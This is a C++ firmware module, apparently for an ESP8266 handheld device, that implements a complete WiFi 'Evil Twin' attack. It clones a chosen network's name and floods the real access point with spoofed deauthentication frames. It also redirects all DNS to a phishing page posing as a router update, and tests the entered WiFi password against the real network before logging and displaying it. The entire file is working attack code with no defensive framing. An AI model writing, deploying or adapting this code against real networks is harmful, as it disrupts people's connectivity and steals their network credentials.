/**
 * EvilTwin.cpp - Evil Twin attack implementation
 */

#include "EvilTwin.h"

EvilTwinModule::EvilTwinModule()
    : display(nullptr), dnsServer(nullptr), webServer(nullptr),
      active(false), deauthActive(false), networkCount(0),
      selectedIndex(0), lastScan(0), lastDeauth(0) {
}

EvilTwinModule::~EvilTwinModule() {
    if (dnsServer) delete dnsServer;
    if (webServer) delete webServer;
}

void EvilTwinModule::begin(DisplayManager* disp) {
    display = disp;
    dnsServer = new DNSServer();
    webServer = new ESP8266WebServer(WEB_SERVER_PORT);
}

void EvilTwinModule::enter() {
    Serial.println(F("Evil Twin Mode"));
    WiFi.mode(WIFI_AP_STA);
    scanNetworks();
}

void EvilTwinModule::exit() {
    stopAP();
    active = false;
}

void EvilTwinModule::update() {
    if (active) {
        dnsServer->processNextRequest();
        webServer->handleClient();
        
        if (deauthActive && millis() - lastDeauth >= DEAUTH_INTERVAL) {
            sendDeauth();
            lastDeauth = millis();
        }
    }
    
    if (millis() - lastScan >= SCAN_INTERVAL) {
        rescan();
    }
    
    displayStatus();
}

void EvilTwinModule::toggleAttack() {
    if (networkCount == 0) return;
    
    active = !active;
    
    if (active) {
        startAP();
    } else {
        stopAP();
    }
}

void EvilTwinModule::selectNextNetwork() {
    if (networkCount == 0) return;
    selectedIndex = (selectedIndex + 1) % networkCount;
    selectedNetwork = networks[selectedIndex];
}

void EvilTwinModule::selectPreviousNetwork() {
    if (networkCount == 0) return;
    selectedIndex = (selectedIndex - 1 + networkCount) % networkCount;
    selectedNetwork = networks[selectedIndex];
}

void EvilTwinModule::rescan() {
    if (active) return;
    scanNetworks();
    lastScan = millis();
}

void EvilTwinModule::scanNetworks() {
    networkCount = 0;
    int n = WiFi.scanNetworks();
    
    for (int i = 0; i < n && i < 16; i++) {
        networks[i].ssid = WiFi.SSID(i);
        networks[i].channel = WiFi.channel(i);
        memcpy(networks[i].bssid, WiFi.BSSID(i), 6);
        networkCount++;
    }
    
    if (networkCount > 0) {
        selectedNetwork = networks[0];
    }
    
    Serial.print(F("Found "));
    Serial.print(networkCount);
    Serial.println(F(" networks"));
}

void EvilTwinModule::startAP() {
    WiFi.softAPConfig(IPAddress(192, 168, 4, 1),
                     IPAddress(192, 168, 4, 1),
                     IPAddress(255, 255, 255, 0));
    WiFi.softAP(selectedNetwork.ssid.c_str());
    
    dnsServer->start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
    
    webServer->on("/", [this]() { handleRoot(); });
    webServer->on("/result", [this]() { handleResult(); });
    webServer->onNotFound([this]() { handleRoot(); });
    webServer->begin();
    
    deauthActive = true;
    
    Serial.print(F("Evil Twin started: "));
    Serial.println(selectedNetwork.ssid);
}

void EvilTwinModule::stopAP() {
    deauthActive = false;
    webServer->stop();
    dnsServer->stop();
    WiFi.softAPdisconnect(true);
    
    Serial.println(F("Evil Twin stopped"));
}

void EvilTwinModule::sendDeauth() {
    wifi_set_channel(selectedNetwork.channel);
    
    uint8_t deauthPacket[26] = {
        0xC0, 0x00, 0x00, 0x00,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x01, 0x00
    };
    
    memcpy(&deauthPacket[10], selectedNetwork.bssid, 6);
    memcpy(&deauthPacket[16], selectedNetwork.bssid, 6);
    
    wifi_send_pkt_freedom(deauthPacket, 26, 0);
}

void EvilTwinModule::handleRoot() {
    String html = F("<!DOCTYPE html><html><head>");
    html += F("<meta name='viewport' content='width=device-width, initial-scale=1.0'>");
    html += F("<style>body{font-family:Arial;max-width:400px;margin:50px auto;padding:20px;}</style>");
    html += F("</head><body><h2>Network Update Required</h2>");
    html += F("<p>Router '");
    html += selectedNetwork.ssid;
    html += F("' needs authentication.</p>");
    html += F("<form action='/result' method='POST'>");
    html += F("<label>Password:</label><br>");
    html += F("<input type='password' name='password' minlength='8' required><br><br>");
    html += F("<input type='submit' value='Update'></form></body></html>");
    
    webServer->send(200, "text/html", html);
}

void EvilTwinModule::handleResult() {
    if (webServer->hasArg("password")) {
        capturedPassword = webServer->arg("password");
        
        WiFi.begin(selectedNetwork.ssid.c_str(), capturedPassword.c_str(),
                   selectedNetwork.channel, selectedNetwork.bssid);
        
        delay(5000);
        
        if (WiFi.status() == WL_CONNECTED) {
            String success = F("<!DOCTYPE html><html><body>");
            success += F("<h2>Password Correct!</h2>");
            success += F("<p>Network updated successfully.</p></body></html>");
            webServer->send(200, "text/html", success);
            
            Serial.println(F("\n=== PASSWORD CAPTURED ==="));
            Serial.print(F("SSID: "));
            Serial.println(selectedNetwork.ssid);
            Serial.print(F("Password: "));
            Serial.println(capturedPassword);
            Serial.println(F("========================\n"));
            
            stopAP();
            active = false;
        } else {
            String retry = F("<!DOCTYPE html><html><head>");
            retry += F("<script>setTimeout(function(){window.location.href='/';},3000);</script>");
            retry += F("</head><body><h2>Incorrect Password</h2>");
            retry += F("<p>Please try again...</p></body></html>");
            webServer->send(200, "text/html", retry);
        }
        
        WiFi.disconnect();
    }
}

void EvilTwinModule::displayStatus() {
    if (!display) return;
    
    display->clear();
    display->drawMenuHeader("EVIL TWIN", selectedIndex, networkCount);
    
    if (networkCount == 0) {
        display->drawTextCentered(30, "No networks", 1);
    } else {
        Adafruit_SSD1306* d = display->getDisplay();
        d->setTextSize(1);
        d->setCursor(2, 15);
        d->print(selectedNetwork.ssid);
        
        d->setCursor(2, 28);
        d->print("CH: ");
        d->print(selectedNetwork.channel);
        
        d->setCursor(2, 40);
        d->print(active ? "ACTIVE" : "Idle");
        
        if (!capturedPassword.isEmpty()) {
            d->setCursor(2, 52);
            d->print("PWD: ");
            d->print(capturedPassword);
        }
    }
    
    display->update();
}
